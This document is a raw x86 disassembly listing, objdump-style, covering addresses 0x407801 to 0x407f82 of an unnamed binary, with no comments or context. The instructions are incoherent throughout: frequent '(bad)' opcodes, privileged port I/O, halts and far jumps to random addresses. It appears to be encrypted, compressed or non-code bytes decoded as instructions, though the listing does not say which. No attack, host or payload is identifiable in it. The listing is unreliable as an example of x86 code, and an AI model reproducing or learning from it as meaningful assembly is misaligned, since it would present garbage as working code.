  407801:	add    DWORD PTR [ebx],eax
  407803:	jecxz  0x4077c7
  407805:	mov    ds:0xb7efb19a,eax
  40780a:	xlat   BYTE PTR ds:[ebx]
  40780b:	cld    
  40780c:	or     ch,BYTE PTR [ebx-0x7e]
  40780f:	cmp    dl,BYTE PTR [ebp+0x150498f2]
  407815:	xchg   ebp,eax
  407816:	sub    bh,bl
  407818:	das    
  407819:	pop    edi
  40781a:	inc    edx
  40781b:	and    bh,BYTE PTR [esi]
  40781d:	dec    edx
  40781e:	arpl   bx,bp
  407820:	xor    bh,BYTE PTR [ecx+eiz*1+0x44]
  407824:	cdq    
  407825:	cmp    DWORD PTR [esi],edi
  407827:	xor    eax,0xd759414a
  40782c:	xchg   esp,eax
  40782d:	adc    ch,BYTE PTR [esi+0x18ee8f05]
  407833:	jno    0x40787a
  407835:	fldcw  WORD PTR [edx+0x2ab2602f]
  40783b:	repz hlt 
  40783d:	push   edx
  40783e:	aas    
  40783f:	ror    DWORD PTR [eax+0x57e84f39],0x85
  407846:	jg     0xb0c9e9b7
  40784c:	pop    eax
  40784d:	cmc    
  40784e:	fimul  WORD PTR [ebx+0x32]
  407851:	call   0x687968e0
  407856:	jnp    0x407858
  407858:	mov    BYTE PTR [ebx-0x5c0ebb1b],al
  40785e:	in     eax,dx
  40785f:	(bad)  
  407860:	cs push 0x3e
  407863:	xlat   BYTE PTR ds:[ebx]
  407864:	addr16 jl 0x4077ed
  407867:	cmp    eax,0x668803fd
  40786c:	jo     0x4078ac
  40786e:	mov    ?,eax
  407870:	in     al,dx
  407871:	dec    esi
  407872:	sbb    al,0xe1
  407874:	sbb    edi,esp
  407876:	or     al,0x5c
  407878:	xchg   esp,eax
  407879:	mov    dh,0x71
  40787b:	sub    al,dl
  40787d:	es xchg ecx,eax
  40787f:	lods   al,BYTE PTR ds:[esi]
  407880:	stc    
  407881:	fisubr WORD PTR [esi]
  407883:	sbb    al,0x2c
  407885:	xchg   ebx,eax
  407886:	lods   eax,DWORD PTR gs:[esi]
  407888:	hlt    
  407889:	sub    esi,DWORD PTR [ebx-0x19437d05]
  40788f:	mov    BYTE PTR [eax-0x57],ch
  407892:	sub    eax,0xffffffd9
  407895:	mov    dh,0x4b
  407897:	loope  0x40788b
  407899:	arpl   bp,bp
  40789b:	xchg   esp,eax
  40789c:	mov    bh,ah
  40789e:	gs enter 0x1337,0xd9
  4078a3:	ret    
  4078a4:	cmc    
  4078a5:	std    
  4078a6:	jg     0x40790c
  4078a8:	mov    eax,ds:0x84826b29
  4078ad:	add    al,0x11
  4078af:	mov    al,ds:0x6fbb059c
  4078b4:	scas   eax,DWORD PTR es:[edi]
  4078b5:	jmp    0x93955e82
  4078ba:	out    0xe,al
  4078bc:	cmp    al,0xdc
  4078be:	sbb    DWORD PTR [esi],esp
  4078c0:	cmp    al,0x96
  4078c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c3:	pop    ecx
  4078c4:	jmp    FWORD PTR [ebx]
  4078c6:	stos   BYTE PTR es:[edi],al
  4078c7:	sub    BYTE PTR [edx+0x5d549dc3],bh
  4078cd:	mov    dh,0xef
  4078cf:	pop    ebx
  4078d0:	xor    eax,0x414c3de9
  4078d5:	or     al,BYTE PTR [ebp+eax*4+0x6cc8fd24]
  4078dc:	cmp    BYTE PTR [ebp+ecx*4-0x35],dl
  4078e0:	out    0x66,eax
  4078e2:	shl    BYTE PTR [eax],1
  4078e4:	pushf  
  4078e5:	out    dx,eax
  4078e6:	stos   BYTE PTR es:[edi],al
  4078e7:	mov    ds:0x92c06b69,al
  4078ec:	in     eax,0x89
  4078ee:	dec    esp
  4078ef:	in     eax,dx
  4078f0:	addr16 push ss
  4078f2:	xchg   DWORD PTR [ebx-0x8],esi
  4078f5:	add    ecx,DWORD PTR [esi+0x18f40c28]
  4078fb:	(bad)  
  4078fc:	mov    DWORD PTR [di-0x5b],edx
  407900:	add    eax,DWORD PTR [ecx]
  407902:	js     0x40791e
  407904:	inc    ebx
  407905:	outs   dx,BYTE PTR ds:[esi]
  407906:	ret    0xa188
  407909:	push   0x36c8b9b9
  40790e:	test   BYTE PTR [ebx-0x39cc1fbb],0xe9
  407915:	push   es
  407916:	add    eax,0xd7d70000
  40791b:	iret   
  40791c:	into   
  40791d:	iret   
  40791e:	(bad)  
  40791f:	aad    0xd5
  407921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407922:	(bad)  
  407923:	in     al,dx
  407924:	in     eax,0x80
  407926:	mov    edi,0xde9004c7
  40792b:	js     0x4079a5
  40792d:	push   0x7c
  40792f:	js     0x4079a9
  407931:	add    bh,ah
  407933:	adc    ch,BYTE PTR [esi]
  407935:	and    eax,0x98500ced
  40793a:	xchg   DWORD PTR [esi*2+0x71892e64],eax
  407941:	pop    esi
  407942:	hlt    
  407943:	dec    eax
  407944:	int3   
  407945:	aaa    
  407946:	mov    dl,dl
  407948:	jne    0x407931
  40794a:	gs and eax,0xee57247a
  407950:	or     DWORD PTR [ebx+0x2f9a3217],0x37
  407957:	(bad)  
  407959:	xchg   ecx,eax
  40795a:	inc    eax
  40795b:	xor    DWORD PTR [ecx-0x22],ebx
  40795e:	or     ah,ah
  407960:	adc    BYTE PTR [edi],cl
  407962:	pop    es
  407963:	xchg   esi,eax
  407964:	xchg   ebp,eax
  407965:	xchg   ebp,eax
  407966:	add    eax,0xb6d307a7
  40796b:	adc    eax,0x94db20df
  407970:	ss jb  0x407931
  407973:	inc    esp
  407974:	dec    esp
  407975:	fstp   QWORD PTR [edi+eax*2-0x71986e89]
  40797c:	jne    0x40792a
  40797e:	aam    0x62
  407980:	inc    edi
  407981:	in     al,0x46
  407983:	xlat   BYTE PTR ds:[ebx]
  407984:	(bad)  
  407985:	stos   DWORD PTR es:[edi],eax
  407986:	jl     0x40795e
  407988:	adc    dh,BYTE PTR [esi+0x72a14524]
  40798e:	cwde   
  40798f:	lds    eax,FWORD PTR [edx-0x13]
  407992:	adc    eax,DWORD PTR [eax+0x41]
  407995:	inc    esi
  407996:	int3   
  407997:	je     0x407a07
  407999:	in     al,dx
  40799a:	xchg   ecx,eax
  40799b:	push   esi
  40799c:	jbe    0x407921
  40799e:	mov    ds:0x237ae94,al
  4079a3:	fstp   QWORD PTR [ebx]
  4079a5:	sbb    al,0xf5
  4079a7:	sbb    DWORD PTR [edx],esi
  4079a9:	cmp    eax,0x674ec0c9
  4079ae:	jmp    0x6ba7a7e6
  4079b3:	mul    BYTE PTR [ecx+0x59]
  4079b6:	jmp    0xb412:0xf74567d1
  4079bd:	and    ebp,DWORD PTR [ebx-0x6f27e948]
  4079c3:	sub    eax,0xd54ceca0
  4079c8:	repnz aaa 
  4079ca:	test   al,0x63
  4079cc:	adc    eax,0x397614a9
  4079d1:	cmp    bl,BYTE PTR [edx]
  4079d3:	xor    al,0x54
  4079d5:	leave  
  4079d6:	out    0x9e,al
  4079d8:	loope  0x407a07
  4079da:	xchg   edi,eax
  4079db:	pop    edi
  4079dc:	mov    al,ds:0x22881e26
  4079e1:	loope  0x4079fc
  4079e3:	in     al,dx
  4079e4:	retf   
  4079e5:	lahf   
  4079e6:	fwait
  4079e7:	call   0x28c0a1e9
  4079ec:	dec    eax
  4079ed:	fild   WORD PTR [edi+0xa366efd]
  4079f3:	fiadd  DWORD PTR [esi-0x5734d093]
  4079f9:	dec    edx
  4079fa:	loopne 0x4079d3
  4079fc:	xor    al,dl
  4079fe:	mov    eax,ds:0xaa24defe
  407a03:	popa   
  407a04:	sub    DWORD PTR [esi-0x32],ebx
  407a07:	pop    eax
  407a08:	popa   
  407a09:	mov    BYTE PTR [ebx+0x5178ec26],ah
  407a0f:	or     edi,edx
  407a11:	cmp    eax,DWORD PTR [ebx]
  407a13:	loop   0x4079fc
  407a15:	pop    ebp
  407a16:	outs   dx,DWORD PTR ds:[esi]
  407a17:	adc    eax,0xf97ace5f
  407a1c:	clc    
  407a1d:	je     0x407a12
  407a1f:	hlt    
  407a20:	or     ecx,esp
  407a22:	dec    edx
  407a23:	push   ebp
  407a24:	add    al,0xd7
  407a26:	jge    0x407a9e
  407a28:	mov    edi,0xef9e8b31
  407a2d:	inc    ecx
  407a2e:	je     0x4079ce
  407a30:	in     eax,0xcc
  407a32:	sub    esi,DWORD PTR [ecx+0x7f9d3d2]
  407a38:	sub    DWORD PTR [ebp+edx*4+0x96557c3],edi
  407a3f:	mov    ebx,0x96f43a01
  407a44:	scas   eax,DWORD PTR es:[edi]
  407a45:	pop    edx
  407a46:	adc    esi,esp
  407a48:	out    dx,eax
  407a49:	and    BYTE PTR [edi],al
  407a4b:	and    ecx,DWORD PTR [esi-0x5f5492ec]
  407a51:	jo     0x407a72
  407a53:	out    dx,eax
  407a54:	jecxz  0x407a5b
  407a56:	push   esp
  407a57:	outs   dx,BYTE PTR ds:[esi]
  407a58:	or     ecx,ebp
  407a5a:	dec    edi
  407a5b:	sbb    DWORD PTR [ebp+0x64],esi
  407a5e:	(bad)  
  407a5f:	jmp    0xdbd14786
  407a64:	lods   al,BYTE PTR ds:[esi]
  407a65:	fmul   DWORD PTR [edi]
  407a67:	jns    0x407a58
  407a69:	add    DWORD PTR [esi+ebx*4],ebp
  407a6c:	scas   eax,DWORD PTR es:[edi]
  407a6d:	mov    eax,ds:0xbc254d73
  407a72:	sub    eax,0x8d941b04
  407a77:	cmp    BYTE PTR [edi+0x7bb7d8ed],al
  407a7d:	pop    edi
  407a7e:	inc    edi
  407a7f:	stos   BYTE PTR es:[edi],al
  407a80:	mov    ds:0x99d89514,eax
  407a85:	sbb    DWORD PTR [eax],0x31
  407a88:	lods   al,BYTE PTR cs:[esi]
  407a8a:	mov    eax,ds:0xc7721951
  407a8f:	push   esi
  407a90:	inc    eax
  407a91:	in     eax,0xa0
  407a93:	jle    0x407a7e
  407a95:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407a97:	or     DWORD PTR [edx+0x75],eax
  407a9a:	xchg   ebx,eax
  407a9b:	fild   DWORD PTR gs:[ebx+0x550083f3]
  407aa2:	cld    
  407aa3:	mov    ds:0x5267558d,al
  407aa8:	xchg   esp,eax
  407aa9:	sbb    cl,ah
  407aab:	aaa    
  407aac:	xchg   BYTE PTR ds:0x2831cd5d,bh
  407ab2:	pop    esp
  407ab3:	scas   al,BYTE PTR es:[edi]
  407ab4:	push   es
  407ab5:	add    edx,DWORD PTR [ecx+0x613b070f]
  407abb:	iret   
  407abc:	fmul   DWORD PTR [edi]
  407abe:	pop    esi
  407abf:	cmp    DWORD PTR [edx],ebp
  407ac1:	fadd   st,st(5)
  407ac3:	push   esi
  407ac4:	fdivp  st(2),st
  407ac6:	xchg   edi,eax
  407ac7:	sub    BYTE PTR [edx+0x2b3da231],bl
  407acd:	stos   BYTE PTR es:[edi],al
  407ace:	rep stos BYTE PTR es:[edi],al
  407ad0:	lods   eax,DWORD PTR ds:[esi]
  407ad1:	data16 fimul WORD PTR [esi-0x165b4240]
  407ad8:	add    al,0x1
  407ada:	jns    0x407b0f
  407adc:	sub    eax,0xca17d5f2
  407ae1:	cmp    DWORD PTR [edi],ebp
  407ae3:	cmp    ah,BYTE PTR [eax+0x56]
  407ae6:	cmp    BYTE PTR [ebx+0x7dddf0db],dh
  407aec:	ins    BYTE PTR es:[edi],dx
  407aed:	bound  ecx,QWORD PTR [edx-0x6e6b7f0d]
  407af3:	neg    BYTE PTR [ecx-0x2e]
  407af6:	add    edi,DWORD PTR [ebx]
  407af8:	pop    ds
  407af9:	mov    dh,0x36
  407afb:	out    dx,al
  407afc:	imul   eax,DWORD PTR [eax-0x7d34fd06],0xffffffc6
  407b03:	xchg   esp,eax
  407b04:	adc    al,0x57
  407b06:	mov    dh,0x72
  407b08:	xchg   BYTE PTR ds:0x8817c57b,bl
  407b0e:	(bad)  
  407b0f:	dec    esi
  407b10:	or     dl,BYTE PTR [ecx-0x3b]
  407b13:	(bad)  
  407b15:	rcl    esp,1
  407b17:	loopne 0x407b39
  407b19:	mov    ecx,ss
  407b1b:	cmp    BYTE PTR [ebx+0x7f162c63],bl
  407b21:	cmc    
  407b22:	inc    ecx
  407b23:	or     al,0x87
  407b25:	mov    bh,0x43
  407b27:	data16 or bl,BYTE PTR [esi-0x54]
  407b2b:	mov    ebx,gs
  407b2d:	inc    esi
  407b2e:	and    al,bl
  407b30:	std    
  407b31:	shr    dl,1
  407b33:	mov    edx,0x39f145f9
  407b38:	daa    
  407b39:	pop    ss
  407b3a:	mov    BYTE PTR gs:[esp+ebp*8+0x24],dh
  407b3f:	mov    ebp,0x4c8f9a51
  407b44:	daa    
  407b45:	fcmovnu st,st(6)
  407b47:	pop    edi
  407b48:	sub    BYTE PTR [ebx],ah
  407b4a:	les    eax,FWORD PTR [eax-0x8]
  407b4d:	stc    
  407b4e:	ds (bad) 
  407b50:	pop    ds
  407b51:	jo     0x407bcc
  407b53:	call   0xc7d3b0f3
  407b58:	shl    DWORD PTR [ebx],cl
  407b5a:	and    al,0x29
  407b5c:	rol    ebx,0x36
  407b5f:	retf   
  407b60:	repnz retf 
  407b62:	sbb    eax,DWORD PTR [edi]
  407b64:	pop    ebp
  407b65:	add    eax,0xb29f973e
  407b6a:	pop    ebp
  407b6b:	out    dx,al
  407b6c:	or     DWORD PTR [edx+0x7460ab20],ebx
  407b72:	std    
  407b73:	xchg   ebp,eax
  407b74:	push   ss
  407b75:	lods   eax,DWORD PTR ds:[esi]
  407b76:	fwait
  407b77:	adc    eax,0xa2c45b66
  407b7c:	int3   
  407b7d:	mov    ch,0x3d
  407b7f:	push   ecx
  407b80:	add    eax,0x5c4e3318
  407b85:	ss int3 
  407b87:	(bad)  
  407b89:	cmp    esp,DWORD PTR [edi+ebp*8]
  407b8c:	inc    esi
  407b8d:	inc    ecx
  407b8e:	mov    ?,WORD PTR [ecx-0x1dee5862]
  407b94:	scas   eax,DWORD PTR es:[edi]
  407b95:	fild   DWORD PTR [ecx+0x423dcdd1]
  407b9b:	dec    eax
  407b9c:	test   al,0xbd
  407b9e:	mov    esp,0xb37081fc
  407ba3:	iret   
  407ba4:	stos   BYTE PTR es:[edi],al
  407ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ba6:	jle    0x407be4
  407ba8:	aad    0x2d
  407baa:	ror    DWORD PTR [eax+0x1c],cl
  407bad:	adc    al,0xd
  407baf:	es push esi
  407bb1:	cmp    dh,BYTE PTR [edx]
  407bb3:	das    
  407bb4:	icebp  
  407bb5:	dec    ebp
  407bb6:	jmp    0x6340a80a
  407bbb:	inc    esp
  407bbc:	xchg   edx,eax
  407bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bbe:	inc    eax
  407bbf:	into   
  407bc0:	cdq    
  407bc1:	pusha  
  407bc2:	loop   0x407be8
  407bc4:	push   cs
  407bc5:	and    eax,0x2e
  407bc8:	xchg   DWORD PTR [ecx],edx
  407bca:	and    cl,BYTE PTR [ebp-0x76]
  407bcd:	test   al,0xa8
  407bcf:	cmp    edi,esp
  407bd1:	mov    al,0xfc
  407bd3:	sbb    al,0x72
  407bd5:	adc    DWORD PTR [esp+edx*1+0x2e],ebp
  407bd9:	mov    al,BYTE PTR ds:[eax+esi*1]
  407bdd:	int    0xf2
  407bdf:	jno    0x407b8c
  407be1:	push   eax
  407be2:	repnz rcl esi,0xb7
  407be6:	and    ah,BYTE PTR [edx+0x49]
  407be9:	(bad)  
  407bea:	outs   dx,BYTE PTR ds:[esi]
  407beb:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bed:	push   0xffffff90
  407bef:	sub    DWORD PTR [ebp-0xb],eax
  407bf2:	jge    0x407bfe
  407bf4:	mov    dl,0x65
  407bf6:	push   ebx
  407bf7:	xor    BYTE PTR [ecx-0x45],bh
  407bfa:	retf   0x891
  407bfd:	push   cs
  407bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bff:	xchg   ebx,eax
  407c00:	ficomp DWORD PTR [esi+edi*2-0x470f385e]
  407c07:	clc    
  407c08:	xchg   edx,edi
  407c0a:	mov    eax,0x2ddc4e6a
  407c0f:	es mov eax,0xf3599ec6
  407c15:	jmp    0x407be8
  407c17:	push   ebx
  407c18:	mov    esi,0x9756adef
  407c1d:	inc    esi
  407c1e:	add    eax,0x203b5d1b
  407c23:	pushf  
  407c24:	call   0x2dfc976f
  407c29:	adc    eax,esp
  407c2b:	das    
  407c2c:	retf   0x982f
  407c2f:	(bad)  
  407c30:	push   DWORD PTR [ebp+0x387a39e8]
  407c36:	inc    edx
  407c37:	jo     0x407c1c
  407c39:	ins    DWORD PTR es:[edi],dx
  407c3a:	outs   dx,BYTE PTR ds:[esi]
  407c3b:	jge    0x407c11
  407c3d:	mov    cl,0xa5
  407c3f:	cld    
  407c40:	jns    0x407c6c
  407c42:	dec    edx
  407c43:	fwait
  407c44:	add    DWORD PTR [esi+0x6b],ebp
  407c47:	dec    ecx
  407c48:	cs dec esp
  407c4a:	jns    0x407be3
  407c4c:	sub    BYTE PTR [eax+0x62],cl
  407c4f:	cmp    DWORD PTR [edi+0x93d864d],edx
  407c55:	aaa    
  407c56:	out    dx,eax
  407c57:	imul   edi,ebp,0xffffffef
  407c5a:	jl     0x407c2c
  407c5c:	imul   ebx,DWORD PTR [edi-0x4407862b],0xfc0c4095
  407c66:	xchg   DWORD PTR [ecx],esi
  407c68:	push   cs
  407c69:	dec    esp
  407c6a:	imul   ebp,DWORD PTR [ecx],0xffffffe5
  407c6d:	ret    
  407c6e:	xor    eax,0x241099e3
  407c73:	test   BYTE PTR [eax-0x6940eb88],al
  407c79:	jmp    0x82b966b4
  407c7e:	and    al,0x8c
  407c80:	mov    ds:0xba9ff5ab,eax
  407c85:	adc    eax,0xb6b2f66a
  407c8a:	jne    0x407c47
  407c8c:	cmp    al,0x6
  407c8e:	into   
  407c8f:	aam    0x47
  407c91:	inc    esp
  407c92:	ins    BYTE PTR es:[edi],dx
  407c93:	sti    
  407c94:	rcl    al,cl
  407c96:	cvtpi2ps xmm2,QWORD PTR [edi]
  407c99:	push   esi
  407c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c9b:	sub    DWORD PTR [esi+0x8d9b15a],esp
  407ca1:	and    eax,0x52c9ef3f
  407ca6:	inc    ebx
  407ca7:	cld    
  407ca8:	or     dl,BYTE PTR es:[ebx+0x35]
  407cac:	jle    0x407ce0
  407cae:	sbb    BYTE PTR [eax+eax*4],dh
  407cb1:	mov    ah,0x6a
  407cb3:	inc    eax
  407cb4:	pop    ds
  407cb5:	popf   
  407cb6:	dec    ecx
  407cb7:	in     eax,0x7f
  407cb9:	xchg   esi,eax
  407cba:	hlt    
  407cbb:	arpl   WORD PTR [edx-0xf44f5b0],di
  407cc1:	cmp    esi,DWORD PTR [ecx+0x366ac5f7]
  407cc7:	outs   dx,DWORD PTR ds:[esi]
  407cc8:	(bad)  
  407cc9:	fimul  DWORD PTR [ebp-0x7031b512]
  407ccf:	cwde   
  407cd0:	jbe    0x407c61
  407cd2:	push   ebx
  407cd3:	fdiv   QWORD PTR [eax]
  407cd5:	add    DWORD PTR [eax+0x76],esp
  407cd8:	pop    ebx
  407cd9:	inc    eax
  407cda:	sbb    cl,BYTE PTR [edx-0x1361c21d]
  407ce0:	inc    esi
  407ce1:	fsub   QWORD PTR [ebx]
  407ce3:	fwait
  407ce4:	and    al,0x20
  407ce6:	mov    cl,0x7
  407ce8:	add    al,0xca
  407cea:	sub    ecx,DWORD PTR ds:0x7d7917ce
  407cf0:	xor    BYTE PTR [edx],dl
  407cf2:	and    BYTE PTR [esi+ebp*2],ah
  407cf5:	lods   al,BYTE PTR ds:[esi]
  407cf6:	(bad)  
  407cf8:	sbb    esi,DWORD PTR [eax-0x3b]
  407cfb:	das    
  407cfc:	push   ds
  407cfd:	pop    ecx
  407cfe:	sbb    eax,DWORD PTR [ecx+0x7a]
  407d01:	je     0x407c93
  407d03:	push   es
  407d04:	aad    0x24
  407d06:	iret   
  407d07:	xchg   ecx,eax
  407d08:	arpl   WORD PTR [edx+0x10],bx
  407d0b:	loopne 0x407d6f
  407d0d:	or     bl,dh
  407d0f:	cmp    al,BYTE PTR [ebx+0x10]
  407d12:	pop    ebx
  407d13:	xor    ch,al
  407d15:	xor    DWORD PTR [eax-0x3b2d8065],edx
  407d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d1c:	(bad)  
  407d1e:	inc    ebx
  407d1f:	(bad)  
  407d20:	push   eax
  407d22:	push   0xb8d257ad
  407d27:	add    ebx,DWORD PTR [ebx]
  407d29:	and    DWORD PTR [ebx],ebp
  407d2b:	jo     0x407d6d
  407d2d:	dec    edi
  407d2e:	dec    edi
  407d2f:	dec    ebp
  407d30:	mov    edx,0xce6edf1a
  407d35:	hlt    
  407d36:	cdq    
  407d37:	mov    ebp,0x81884a7f
  407d3c:	lods   eax,DWORD PTR ds:[esi]
  407d3d:	push   ds
  407d3e:	outs   dx,BYTE PTR ds:[esi]
  407d3f:	loope  0x407dab
  407d41:	inc    ebp
  407d42:	enter  0xfc1c,0x49
  407d46:	idiv   BYTE PTR [ebx]
  407d48:	inc    esp
  407d49:	mov    cl,BYTE PTR [ebx+0x71]
  407d4c:	pop    edx
  407d4d:	jle    0x407d40
  407d4f:	push   eax
  407d50:	adc    DWORD PTR [eax-0xe],edx
  407d53:	and    DWORD PTR [eax*8+0x399dd306],ebp
  407d5a:	mov    cl,0x7c
  407d5c:	and    BYTE PTR [eax+0x686eed9f],bh
  407d62:	jl     0x407ce8
  407d64:	clc    
  407d65:	or     ebx,ecx
  407d67:	(bad)  [eax+0x5220ff45]
  407d6d:	sbb    BYTE PTR [edx],cl
  407d6f:	add    DWORD PTR [ebx+0x218d4c2c],eax
  407d75:	push   cs
  407d76:	(bad)
  407d79:	xlat   BYTE PTR ds:[ebx]
  407d7a:	fidiv  DWORD PTR [ebx]
  407d7c:	(bad)  
  407d7d:	mov    esp,eax
  407d7f:	fcmove st,st(4)
  407d81:	cs mov ah,0xbd
  407d84:	sub    DWORD PTR [ecx+0x17],edx
  407d87:	sub    BYTE PTR [esi+0x7670ae35],al
  407d8d:	adc    DWORD PTR [esi+0x5f144e77],esp
  407d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d94:	dec    edx
  407d95:	mov    ebx,0xe8fea139
  407d9a:	mov    eax,ds:0x5cebf796
  407d9f:	mov    cl,0xb8
  407da1:	sub    DWORD PTR [ecx],eax
  407da3:	aam    0x95
  407da5:	dec    edi
  407da6:	pop    ss
  407da7:	add    al,BYTE PTR [ebp-0x896d6cd]
  407dad:	(bad)  
  407dae:	mov    ds:0x624a6170,al
  407db3:	mov    ecx,eax
  407db5:	mov    dh,0x18
  407db7:	pop    eax
  407db8:	mov    eax,?
  407dba:	add    al,0xc4
  407dbc:	jnp    0x407d77
  407dbe:	xor    BYTE PTR [edi],al
  407dc0:	out    0x28,eax
  407dc2:	mov    ah,0x94
  407dc4:	adc    BYTE PTR [edx],ah
  407dc6:	sahf   
  407dc7:	jle    0x407d82
  407dc9:	(bad)  
  407dca:	mov    al,ds:0xfdb7a2bf
  407dcf:	(bad)  
  407dd0:	push   ebp
  407dd1:	jp     0x407de1
  407dd3:	repnz lds ebx,FWORD PTR [edx]
  407dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dd7:	stos   DWORD PTR es:[edi],eax
  407dd8:	dec    esp
  407dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dda:	jle    0x407dfe
  407ddc:	(bad)  
  407ddd:	fnstenv [ebp+0x57]
  407de0:	inc    edx
  407de1:	iret   
  407de2:	ins    BYTE PTR es:[edi],dx
  407de3:	sahf   
  407de4:	js     0x407dc8
  407de6:	xchg   edx,eax
  407de7:	xchg   ecx,eax
  407de8:	cvtpi2ps xmm2,QWORD PTR [ebp-0x15ed9c5c]
  407def:	push   edi
  407df0:	ja     0x407e33
  407df2:	int3   
  407df3:	(bad)  
  407df4:	and    DWORD PTR [ebx+0x25],esi
  407df7:	mov    dh,0x17
  407df9:	inc    edi
  407dfa:	jg     0x407dca
  407dfc:	jle    0x407e30
  407dfe:	push   es
  407dff:	mov    eax,ds:0xcab9a667
  407e04:	pop    eax
  407e05:	cdq    
  407e06:	lock xor esi,DWORD PTR [edi-0x653022b3]
  407e0d:	xor    bl,ah
  407e0f:	not    bl
  407e11:	inc    edi
  407e12:	das    
  407e13:	push   ebp
  407e14:	(bad)  
  407e16:	push   ss
  407e17:	test   BYTE PTR [edx],bl
  407e19:	data16 mov bl,0x68
  407e1c:	gs stc 
  407e1e:	out    dx,eax
  407e1f:	add    eax,edi
  407e21:	jmp    0x40832c
  407e26:	rol    esp,0x3f
  407e29:	(bad)
  407e2d:	retf   
  407e2e:	aaa    
  407e2f:	aas    
  407e30:	push   ss
  407e31:	cs adc eax,0x824cb6e5
  407e37:	loope  0x407eb1
  407e39:	js     0x407ea5
  407e3b:	jl     0x407eb5
  407e3d:	js     0x407e76
  407e3f:	mov    esi,0x6e5083d3
  407e44:	mov    al,0xa3
  407e46:	jg     0x407e21
  407e48:	lods   al,BYTE PTR ds:[esi]
  407e49:	enter  0x2bbe,0x65
  407e4d:	xor    eax,0x541249b8
  407e52:	xchg   DWORD PTR [ecx-0x12],eax
  407e55:	sub    bl,BYTE PTR [ebp+eiz*8-0x7a]
  407e59:	test   eax,0x58658cfc
  407e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e5f:	test   BYTE PTR [esi-0xc9b96c5],0x13
  407e66:	sbb    eax,0xb137a2c7
  407e6b:	adc    al,0xb7
  407e6d:	cwde   
  407e6e:	jo     0x407eef
  407e70:	jae    0x407e9d
  407e72:	jno    0x407e0c
  407e74:	clc    
  407e75:	mov    ebx,0xbfb3900e
  407e7a:	mov    al,0xcf
  407e7c:	(bad)  
  407e7e:	pop    ebx
  407e7f:	outs   dx,BYTE PTR ds:[esi]
  407e80:	add    DWORD PTR [edi-0x21],0xb821bb39
  407e87:	pop    ecx
  407e88:	mov    BYTE PTR [edi],ah
  407e8a:	outs   dx,BYTE PTR ds:[esi]
  407e8b:	clc    
  407e8c:	add    BYTE PTR [edi],bl
  407e8e:	ret    
  407e8f:	pop    esi
  407e90:	inc    esi
  407e91:	pop    ebx
  407e92:	xchg   esi,eax
  407e93:	pushf  
  407e94:	push   es
  407e95:	repnz sbb BYTE PTR [ebp+ecx*1-0xd390eda],ch
  407e9d:	and    BYTE PTR [esp+ebx*4],dh
  407ea0:	push   0xd9c4cedc
  407ea5:	call   0x69bc2adb
  407eaa:	mov    ebp,0x97c5cdcb
  407eaf:	mov    esi,0x3f5b87b9
  407eb4:	es jmp 0x66e1:0x59e62019
  407ebc:	loop   0x407eae
  407ebe:	cld    
  407ebf:	pop    ss
  407ec0:	jne    0x407e75
  407ec2:	sbb    cl,BYTE PTR [ebp+0x2dfa8d56]
  407ec8:	and    DWORD PTR [edi+0x4d31047d],esp
  407ece:	xchg   DWORD PTR [edi-0x2b],esi
  407ed1:	cli    
  407ed2:	pop    es
  407ed3:	jl     0x407e94
  407ed5:	xchg   ecx,eax
  407ed6:	pop    edi
  407ed7:	(bad)  
  407ed8:	pop    edi
  407ed9:	dec    ebx
  407eda:	fadd   QWORD PTR [eax+0x1a]
  407edd:	pop    ecx
  407ede:	outs   dx,BYTE PTR ds:[esi]
  407edf:	pop    eax
  407ee0:	sbb    BYTE PTR [ebx+0x3afb349b],dl
  407ee6:	rcr    BYTE PTR [edx-0x45],0x10
  407eea:	loop   0x407f00
  407eec:	mov    eax,0x67756a5e
  407ef1:	jno    0x407f42
  407ef3:	(bad)  ds:0xa8278b1c
  407ef9:	or     dl,ch
  407efb:	push   cs
  407efc:	imul   ebx,DWORD PTR [ebp+esi*2+0x4434f8cf],0x7b
  407f04:	(bad)  
  407f05:	leave  
  407f06:	ret    0x48ed
  407f09:	and    eax,0x74987b6e
  407f0e:	jmp    0xd342871c
  407f13:	fwait
  407f14:	inc    edx
  407f15:	xor    esi,ebx
  407f17:	fwait
  407f18:	icebp  
  407f19:	scas   al,BYTE PTR es:[edi]
  407f1a:	sbb    BYTE PTR [eax+edx*8+0x76],al
  407f1e:	mov    dl,bh
  407f20:	ror    BYTE PTR [edx-0x748e0445],cl
  407f26:	cmp    cl,BYTE PTR [edi+0x45]
  407f29:	jl     0x407ef5
  407f2b:	mov    esi,0x160e5816
  407f30:	scas   eax,DWORD PTR es:[edi]
  407f31:	(bad)  
  407f32:	ins    DWORD PTR es:[edi],dx
  407f33:	cmp    BYTE PTR [esi-0x2e9d11e1],0xf6
  407f3a:	out    0x6d,al
  407f3c:	add    dh,bh
  407f3e:	mov    ecx,0x32d577d1
  407f43:	sti    
  407f44:	out    dx,al
  407f45:	pop    esi
  407f46:	hlt    
  407f47:	or     al,0x34
  407f49:	into   
  407f4a:	adc    al,0xa3
  407f4c:	pop    ebx
  407f4d:	ret    
  407f4e:	xlat   BYTE PTR ds:[ebx]
  407f4f:	ret    
  407f50:	or     al,0x94
  407f52:	fbld   TBYTE PTR [ecx+0x21]
  407f55:	retf   0x1781
  407f58:	push   ebx
  407f59:	and    eax,0x6dfca330
  407f5e:	mov    bh,0xb4
  407f60:	or     dh,bl
  407f62:	fcmove st,st(0)
  407f64:	fmul   QWORD PTR [ebx+0x5efbd2e1]
  407f6a:	dec    eax
  407f6b:	inc    ecx
  407f6c:	add    al,0x72
  407f6e:	rcr    DWORD PTR [eax-0x39edeaee],0xd2
  407f75:	push   cs
  407f76:	enter  0x8d6,0xd1
  407f7a:	shl    BYTE PTR ds:0x4b812957,0x1a
  407f81:	pop    ebp
  407f82:	into   
